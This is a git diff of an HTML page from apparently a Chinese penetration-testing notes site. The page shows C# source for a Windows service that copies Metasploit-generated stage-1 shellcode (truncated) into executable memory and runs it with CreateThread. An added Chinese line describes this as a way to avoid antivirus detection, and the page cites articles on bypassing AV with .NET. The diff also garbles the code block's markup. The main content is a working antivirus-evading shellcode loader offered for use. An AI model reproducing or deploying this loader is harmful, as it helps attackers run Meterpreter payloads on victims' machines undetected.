@@ -174,6 +174,13 @@
     </li>
 
         
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../reverse_engineering_tool/">逆向工程工具</a>
+        
+    </li>
+
+        
     </ul>
 <li>
           
@@ -263,8 +270,10 @@
                 <h1 id="net-shellcode">.net 执行shellcode</h1>
 <hr />
 <h2 id="_1">如下</h2>
-<pre><code>
-// from https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/
+<p>建立对shellcode进行处理，防止被杀</p>
+<p>```c#
+// from 
+// https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -273,105 +282,84 @@ using System.Diagnostics;
 using System.Linq;
 using System.ServiceProcess;
 using System.Text;
-using System.Runtime.InteropServices;
-
-namespace metservice
+using System.Runtime.InteropServices;</p>
+<p>namespace metservice
 {
     public partial class Service1 : ServiceBase
     {
         public Service1()
         {
             InitializeComponent();
-        }
-
-        protected override void OnStart(string[] args)
-        {
-            // native function's compiled code
-            // generated with metasploit
-            byte[] shellcode = new byte[] {
-0xbf,0xe2,0xe6,0x44,.... (stage 1 shellcode)
-                };
-
+        }</p>
+<pre><code>    protected override void OnStart(string[] args)
+    {
+        // native function's compiled code
+        // generated with metasploit
+        byte[] shellcode = new byte[] {
+</code></pre>
+<p>0xbf,0xe2,0xe6,0x44,.... (stage 1 shellcode)
+                }; 
             UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,
                                 MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
             IntPtr hThread = IntPtr.Zero;
             UInt32 threadId = 0;
-            // prepare data
-
-
-            IntPtr pinfo = IntPtr.Zero;
-
-            // execute native code
-
+            // prepare data 
+            IntPtr pinfo = IntPtr.Zero; 
+            // execute native code 
             hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            WaitForSingleObject(hThread, 0xFFFFFFFF); 
+      }</p>
+<pre><code>    private static UInt32 MEM_COMMIT = 0x1000; 
+    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
 
-      }
+    [DllImport("kernel32")]
+    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+         UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
-        private static UInt32 MEM_COMMIT = 0x1000;
+    [DllImport("kernel32")]
+    private static extern bool VirtualFree(IntPtr lpAddress,
+                          UInt32 dwSize, UInt32 dwFreeType);
 
-        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+    [DllImport("kernel32")]
+    private static extern IntPtr CreateThread( 
+      UInt32 lpThreadAttributes,
+      UInt32 dwStackSize,
+      UInt32 lpStartAddress,
+      IntPtr param,
+      UInt32 dwCreationFlags,
+      ref UInt32 lpThreadId 
+      );
+    [DllImport("kernel32")]
+    private static extern bool CloseHandle(IntPtr handle);
 
-
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
-             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern bool VirtualFree(IntPtr lpAddress,
-                              UInt32 dwSize, UInt32 dwFreeType);
-
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern IntPtr CreateThread(
-
-          UInt32 lpThreadAttributes,
-          UInt32 dwStackSize,
-          UInt32 lpStartAddress,
-          IntPtr param,
-          UInt32 dwCreationFlags,
-          ref UInt32 lpThreadId
-
-          );
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern bool CloseHandle(IntPtr handle);
-
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern UInt32 WaitForSingleObject(
-
-          IntPtr hHandle,
-          UInt32 dwMilliseconds
-          );
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern IntPtr GetModuleHandle(
-
-          string moduleName
-
-          );
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern UInt32 GetProcAddress(
-
-          IntPtr hModule,
-          string procName
-
-          );
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern UInt32 LoadLibrary(
-
-          string lpFileName
-
-          );
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern UInt32 GetLastError();
-
-
-        protected override void OnStop()
-        {
-        }
+    [DllImport("kernel32")]
+    private static extern UInt32 WaitForSingleObject( 
+      IntPtr hHandle,
+      UInt32 dwMilliseconds
+      );
+    [DllImport("kernel32")]
+    private static extern IntPtr GetModuleHandle( 
+      string moduleName 
+      );
+    [DllImport("kernel32")]
+    private static extern UInt32 GetProcAddress( 
+      IntPtr hModule,
+      string procName 
+      );
+    [DllImport("kernel32")]
+    private static extern UInt32 LoadLibrary( 
+      string lpFileName 
+      );
+    [DllImport("kernel32")]
+    private static extern UInt32 GetLastError(); 
+    protected override void OnStop()
+    {
     }
 }
 </code></pre>
-
+<p>}
+```</p>
 <h2 id="_2">引用</h2>
 <ul>
 <li><a href="https://www.mattandreko.com/2012/02/23/using-net-to-bypass-av/">Using .net to Bypass AV</a></li>
@@ -387,7 +375,7 @@ namespace metservice
         <a href="../linux_persistence_note/" class="btn btn-neutral float-right" title="linux 密码记录(client/server)">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
-        <a href="../pentest_tools/" class="btn btn-neutral" title="在渗透中需要用的工具收集"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../reverse_engineering_tool/" class="btn btn-neutral" title="逆向工程工具"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -413,7 +401,7 @@ namespace metservice
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../pentest_tools/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../reverse_engineering_tool/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
         <span style="margin-left: 15px"><a href="../linux_persistence_note/" style="color: #fcfcfc">Next &raquo;</a></span>
